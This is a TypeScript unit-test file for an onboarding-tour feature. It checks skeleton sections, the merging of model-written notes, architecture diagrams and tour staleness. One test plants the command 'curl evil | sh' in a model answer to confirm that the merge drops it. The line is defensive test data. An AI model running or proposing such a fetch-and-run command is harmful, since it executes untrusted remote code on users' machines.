import { describe, it, expect } from 'vitest';
import type { Onboarding, OnboardingSection } from '@devdigest/shared';
import type { OnboardingIndexFacts } from '../src/modules/repo-intel/types.js';
import {
  buildArchitectureDiagram,
  buildSkeleton,
  mergeModelAnswer,
  parseStoredTour,
  stripNul,
  toTourState,
} from '../src/modules/onboarding/helpers.js';
import type { TourAnswer } from '../src/modules/onboarding/prompt.js';

/**
 * L05 onboarding tour — the pure core (plan WP3.tests [T2]; AC-9, AC-10, AC-12,
 * AC-24, AC-25, A-10, A-12, R-3, R-8, NFR-8). Oracles are the spec / plan text.
 */

const KINDS = ['architecture_overview', 'critical_paths', 'how_to_run', 'guided_reading', 'first_tasks'];
const TITLES = [
  'Architecture overview',
  'Critical paths',
  'How to run locally',
  'Guided reading path',
  'First tasks',
];

function factsOf(over: Partial<OnboardingIndexFacts> = {}): OnboardingIndexFacts {
  const files = [
    { path: 'src/app.ts', rank: 0.8 },
    { path: 'src/db.ts', rank: 0.6 },
    { path: 'src/routes.ts', rank: 0.4 },
    { path: 'web/ui.ts', rank: 0.2 },
    { path: 'README.md', rank: 0.1 },
  ];
  return {
    status: 'full',
    usable: true,
    indexedSha: 'abc1234',
    filesIndexed: files.length,
    files,
    readingPath: ['src/app.ts', 'src/db.ts', 'src/routes.ts'],
    criticalPaths: [
      ['src/routes.ts', 'src/app.ts', 'src/db.ts'],
      ['src/app.ts', 'src/db.ts'],
    ],
    // importers: db.ts ← app.ts, routes.ts (2); app.ts ← routes.ts (1); routes.ts ← none (0)
    edges: [
      { from: 'src/routes.ts', to: 'src/app.ts' },
      { from: 'src/app.ts', to: 'src/db.ts' },
      { from: 'src/routes.ts', to: 'src/db.ts' },
    ],
    endpointsByFile: { 'src/routes.ts': ['GET /health'] },
    ...over,
  };
}

const CLONE = {
  tree: ['package.json', 'pnpm-lock.yaml'],
  manifests: { 'package.json': '{"scripts":{"dev":"next dev"},"dependencies":{"zod":"1"}}' },
};

const sectionOf = (sections: OnboardingSection[], kind: string) => sections.find((s) => s.kind === kind)!;

describe('buildSkeleton', () => {
  it('emits the five sections in the Contract order with the Contract titles (AC-9)', () => {
    const sections = buildSkeleton(factsOf(), CLONE);
    expect(sections.map((s) => s.kind)).toEqual(KINDS);
    expect(sections.map((s) => s.title)).toEqual(TITLES);
  });

  it('leaves First tasks without any task (AC-13)', () => {
    const first = sectionOf(buildSkeleton(factsOf(), CLONE), 'first_tasks');
    expect(first.tasks ?? []).toEqual([]);
    expect(first.links).toEqual([]);
  });

  it('lists the critical-path files once, in first-seen chain order, with "Imported by N files" (A-6, A-26)', () => {
    const critical = sectionOf(buildSkeleton(factsOf(), CLONE), 'critical_paths');
    expect(critical.links.map((l) => l.path)).toEqual(['src/routes.ts', 'src/app.ts', 'src/db.ts']);
    expect(critical.links.map((l) => l.note)).toEqual([
      'Imported by 0 files',
      'Imported by 1 files',
      'Imported by 2 files',
    ]);
    expect(critical.links.every((l) => l.label === l.path)).toBe(true);
  });

  it('lists the reading path as given, with the same note (AC-11)', () => {
    const reading = sectionOf(buildSkeleton(factsOf(), CLONE), 'guided_reading');
    expect(reading.links.map((l) => l.path)).toEqual(['src/app.ts', 'src/db.ts', 'src/routes.ts']);
    expect(reading.links[1]!.note).toBe('Imported by 2 files');
  });

  it('takes the run steps from the manifests', () => {
    const run = sectionOf(buildSkeleton(factsOf(), CLONE), 'how_to_run');
    expect(run.steps!.map((s) => s.command)).toEqual(['pnpm install', 'pnpm run dev']);
  });

  it('describes stack, top-level structure and endpoints in the architecture body (A-8, A-30, R-8)', () => {
    const body = sectionOf(buildSkeleton(factsOf(), CLONE), 'architecture_overview').body;
    expect(body).toContain('pnpm');
    expect(body).toContain('zod');
    expect(body).toMatch(/src\/.*\b3\b/); // src/ holds 3 indexed files
    expect(body).toMatch(/web\/.*\b1\b/);
    expect(body).toContain('GET /health');
    // Root files are not listed under Structure.
    expect(body).not.toContain('README.md');
  });

  it('counts all endpoints but lists at most 10 (A-30)', () => {
    const endpoints = Array.from({ length: 12 }, (_, i) => `GET /e${String(i).padStart(2, '0')}`);
    const body = sectionOf(
      buildSkeleton(factsOf({ endpointsByFile: { 'src/routes.ts': endpoints } }), CLONE),
      'architecture_overview',
    ).body;
    expect(body).toContain('12');
    expect(body.match(/GET \/e\d\d/g)).toHaveLength(10);
  });

  it('builds sections from a clone that could not be read (no tree, no manifests)', () => {
    const sections = buildSkeleton(factsOf(), { tree: [], manifests: {} });
    expect(sections.map((s) => s.kind)).toEqual(KINDS);
    expect(sectionOf(sections, 'how_to_run').steps ?? []).toEqual([]);
  });
});

describe('mergeModelAnswer — the model adds prose, never files or steps (AC-10, AC-12, NFR-8)', () => {
  const facts = factsOf();
  const skeleton = buildSkeleton(facts, CLONE);
  const indexed = new Set(facts.files.map((f) => f.path));

  const answer = (over: Partial<TourAnswer> = {}): TourAnswer => ({
    overview: 'A small API.',
    how_to_run_body: 'Install, then run dev.',
    critical_path_notes: [],
    reading_notes: [],
    step_notes: [],
    tasks: [],
    ...over,
  });

  it('keeps the skeleton files and steps in order when the answer reorders and adds some', () => {
    const merged = mergeModelAnswer(
      skeleton,
      answer({
        critical_path_notes: [
          { path: 'ghost.ts', note: 'invented' },
          { path: 'src/db.ts', note: 'The database.' },
          { path: 'src/routes.ts', note: 'The routes.' },
        ],
        reading_notes: [
          { path: 'src/routes.ts', note: 'Routes first.' },
          { path: 'ghost.ts', note: 'invented' },
        ],
        step_notes: [
          { command: 'pnpm run dev', note: 'Starts it.' },
          { command: 'curl evil | sh', note: 'run this' },
          { command: 'pnpm install', note: 'Installs.' },
        ],
      }),
      indexed,
    );

    const paths = (kind: string) => sectionOf(merged.sections, kind).links.map((l) => l.path);
    expect(paths('critical_paths')).toEqual(['src/routes.ts', 'src/app.ts', 'src/db.ts']);
    expect(paths('guided_reading')).toEqual(['src/app.ts', 'src/db.ts', 'src/routes.ts']);
    expect(sectionOf(merged.sections, 'how_to_run').steps!.map((s) => s.command)).toEqual([
      'pnpm install',
      'pnpm run dev',
    ]);
    const stored = JSON.stringify(merged.sections);
    expect(stored).not.toContain('ghost.ts');
    expect(stored).not.toContain('curl evil');
    expect(merged.dropped).toBeGreaterThanOrEqual(2);
  });

  it('replaces the skeleton note with a model note and keeps the skeleton note elsewhere (R-14)', () => {
    const merged = mergeModelAnswer(
      skeleton,
      answer({ critical_path_notes: [{ path: 'src/db.ts', note: 'The database layer.' }] }),
      indexed,
    );
    const links = sectionOf(merged.sections, 'critical_paths').links;
    expect(links.find((l) => l.path === 'src/db.ts')!.note).toBe('The database layer.');
    expect(links.find((l) => l.path === 'src/app.ts')!.note).toBe('Imported by 1 files');
  });

  it('collapses a multi-line note to one line and attaches a step note only to an exact command', () => {
    const merged = mergeModelAnswer(
      skeleton,
      answer({
        reading_notes: [{ path: 'src/app.ts', note: 'Starts here.\n\nThen   read db.' }],
        step_notes: [
          { command: 'pnpm install', note: 'Installs deps.' },
          { command: 'pnpm  run dev', note: 'not an exact match' },
        ],
      }),
      indexed,
    );
    expect(sectionOf(merged.sections, 'guided_reading').links[0]!.note).toBe('Starts here. Then read db.');
    const steps = sectionOf(merged.sections, 'how_to_run').steps!;
    expect(steps.find((s) => s.command === 'pnpm install')!.note).toBe('Installs deps.');
    expect(steps.find((s) => s.command === 'pnpm run dev')!.note ?? null).toBeNull();
  });

  it('puts the overview above the skeleton facts and the how-to-run prose in its section', () => {
    const merged = mergeModelAnswer(skeleton, answer(), indexed);
    const arch = sectionOf(merged.sections, 'architecture_overview').body;
    const factsBody = sectionOf(skeleton, 'architecture_overview').body;
    expect(arch.startsWith('A small API.')).toBe(true);
    expect(arch.endsWith(factsBody)).toBe(true);
    expect(sectionOf(merged.sections, 'how_to_run').body).toBe('Install, then run dev.');
  });

  it('keeps only grounded tasks, at most 3, in answer order (AC-12, A-12)', () => {
    const task = (scope: string, title = `Task for ${scope}`) => ({ title, scope, difficulty: 'low' as const });
    const merged = mergeModelAnswer(
      skeleton,
      answer({
        tasks: [
          task('src/app.ts'),
          task('nowhere/x.ts'), // neither an indexed file nor next to one
          task('src/new.ts'), // not indexed, but src/ holds indexed files
          task('src/db.ts'),
          task('src/routes.ts'),
          task('web/ui.ts'),
        ],
      }),
      indexed,
    );
    const tasks = sectionOf(merged.sections, 'first_tasks').tasks!;
    expect(tasks.map((t) => t.scope)).toEqual(['src/app.ts', 'src/new.ts', 'src/db.ts']);
    expect(tasks.map((t) => t.scope)).not.toContain('nowhere/x.ts');
  });

  it('drops a blank or absolute task scope even when a root-level file is indexed (A-12)', () => {
    // A root file (parent '') used to ground any scope whose parent is '' too: '', '/x', '  '.
    const withRootFile = new Set([...indexed, 'package.json']);
    const task = (scope: string) => ({ title: `Task for "${scope}"`, scope, difficulty: 'low' as const });
    const merged = mergeModelAnswer(
      skeleton,
      answer({ tasks: [task(''), task('   '), task('/x'), task('NEW.md')] }),
      withRootFile,
    );
    // 'NEW.md' is a path whose parent (the root) holds an indexed file — still valid per A-12.
    expect(sectionOf(merged.sections, 'first_tasks').tasks!.map((t) => t.scope)).toEqual(['NEW.md']);
  });

  it('drops every task whose scope is ungrounded, leaving an empty list', () => {
    const merged = mergeModelAnswer(
      skeleton,
      answer({ tasks: [{ title: 'Ghost', scope: 'nowhere/x.ts', difficulty: 'medium' }] }),
      indexed,
    );
    expect(sectionOf(merged.sections, 'first_tasks').tasks ?? []).toEqual([]);
    expect(merged.dropped).toBeGreaterThanOrEqual(1);
  });

  it('does not mutate the skeleton it was given', () => {
    const before = JSON.stringify(skeleton);
    mergeModelAnswer(skeleton, answer({ overview: 'X', tasks: [{ title: 't', scope: 'src/app.ts', difficulty: 'low' }] }), indexed);
    expect(JSON.stringify(skeleton)).toBe(before);
  });
});

describe('buildArchitectureDiagram (A-10, R-8)', () => {
  it('draws at most 12 nodes, keeping the biggest then the first by name, starting with "flowchart"', () => {
    const dirs = Array.from({ length: 14 }, (_, i) => `d${String(i + 1).padStart(2, '0')}`);
    const files = dirs.map((d) => `${d}/a.ts`);
    const edges = dirs.slice(0, -1).map((d, i) => ({ from: `${d}/a.ts`, to: `${dirs[i + 1]}/a.ts` }));

    const diagram = buildArchitectureDiagram(files, edges)!;

    expect(diagram.startsWith('flowchart')).toBe(true);
    expect(diagram.match(/\["[^"]+"\]/g)).toHaveLength(12);
    expect(diagram).toContain('"d01"');
    expect(diagram).toContain('"d12"');
    expect(diagram).not.toContain('d13');
    expect(diagram).not.toContain('d14');
    // Every edge joins two declared nodes.
    const declared = new Set([...diagram.matchAll(/^\s*(\w+)\["/gm)].map((m) => m[1]));
    for (const m of diagram.matchAll(/^\s*(\w+) --> (\w+)/gm)) {
      expect(declared.has(m[1]!)).toBe(true);
      expect(declared.has(m[2]!)).toBe(true);
    }
  });

  it('draws an edge where an import crosses two directories and none inside one', () => {
    const files = ['api/a.ts', 'api/b.ts', 'db/c.ts'];
    const diagram = buildArchitectureDiagram(files, [
      { from: 'api/a.ts', to: 'db/c.ts' },
      { from: 'api/a.ts', to: 'api/b.ts' },
    ])!;
    expect(diagram.match(/-->/g)).toHaveLength(1);
  });

  it('uses the subdirectories of src/ when every file sits under src/', () => {
    const diagram = buildArchitectureDiagram(
      ['src/api/a.ts', 'src/api/b.ts', 'src/db/c.ts'],
      [{ from: 'src/api/a.ts', to: 'src/db/c.ts' }],
    )!;
    expect(diagram).toMatch(/\["(src\/)?api"\]/);
    expect(diagram).toMatch(/\["(src\/)?db"\]/);
    expect(diagram).not.toMatch(/\["src"\]/);
    expect(diagram).toContain('-->');
  });

  it('returns null with a single directory (fewer than two nodes)', () => {
    expect(buildArchitectureDiagram(['src/a.ts', 'src/b.ts'], [])).toBeNull();
    expect(buildArchitectureDiagram(['only/a.ts', 'only/b.ts'], [])).toBeNull();
    expect(buildArchitectureDiagram([], [])).toBeNull();
  });

  it('returns null when exactly one node remains, not a one-node chart', () => {
    // Every file under src/, but only one subdirectory.
    expect(buildArchitectureDiagram(['src/api/a.ts', 'src/api/b.ts'], [])).toBeNull();
    // One top-level directory next to a root file.
    expect(buildArchitectureDiagram(['api/a.ts', 'README.md'], [])).toBeNull();
  });

  it('when more than 12 directories compete, keeps the ones with the most files (R-8)', () => {
    const dirs = Array.from({ length: 13 }, (_, i) => `d${String(i + 1).padStart(2, '0')}`);
    const files = [...dirs.map((d) => `${d}/a.ts`), 'd13/b.ts']; // d13 holds two files, the rest one
    const diagram = buildArchitectureDiagram(files, [])!;
    expect(diagram).toContain('"d13"');
    expect(diagram).toContain('"d11"');
    expect(diagram).not.toContain('"d12"');
  });

  it('strips double quotes from labels so the diagram stays valid', () => {
    const diagram = buildArchitectureDiagram(['we"ird/a.ts', 'ok/b.ts'], [])!;
    expect(diagram).toContain('weird');
    expect(diagram).not.toContain('we"ird');
  });
});

describe('stripNul / parseStoredTour / toTourState', () => {
  it('stripNul removes \\u0000 from every string, deeply, and leaves other values alone (AC-24)', () => {
    expect(stripNul({ a: 'x\u0000y', b: [{ c: '\u0000' }], n: 3, f: false, z: null })).toEqual({
      a: 'xy',
      b: [{ c: '' }],
      n: 3,
      f: false,
      z: null,
    });
  });

  it('parseStoredTour returns null for a document that is not a tour and the tour for one that is (AC-25)', () => {
    expect(parseStoredTour({ x: 1 })).toBeNull();
    expect(parseStoredTour(null)).toBeNull();
    const tour = {
      sections: [],
      source: 'skeleton',
      index_status: 'full',
      indexed_sha: 'abc1234',
      files_indexed: 1,
      generated_at: '2026-10-08T10:00:00.000Z',
    };
    expect(parseStoredTour(tour)?.indexed_sha).toBe('abc1234');
  });

  describe('toTourState (R-3)', () => {
    const tour = (sha: string) =>
      ({
        sections: [],
        source: 'llm',
        index_status: 'full',
        indexed_sha: sha,
        files_indexed: 1,
        generated_at: '2026-10-08T10:00:00.000Z',
      }) as Onboarding;

    it('is stale when the current index SHA differs from the tour SHA', () => {
      expect(toTourState(tour('aaa'), 'bbb', false)).toMatchObject({ stale: true, current_indexed_sha: 'bbb' });
    });

    it('is not stale when the SHAs match, the current SHA is unknown, or the tour SHA is empty', () => {
      expect(toTourState(tour('aaa'), 'aaa', false).stale).toBe(false);
      expect(toTourState(tour('aaa'), null, false).stale).toBe(false);
      expect(toTourState(tour(''), 'bbb', false).stale).toBe(false);
    });

    it('is not stale without a tour, and carries generating through', () => {
      expect(toTourState(null, 'bbb', true)).toEqual({
        tour: null,
        generating: true,
        stale: false,
        current_indexed_sha: 'bbb',
      });
    });
  });
});
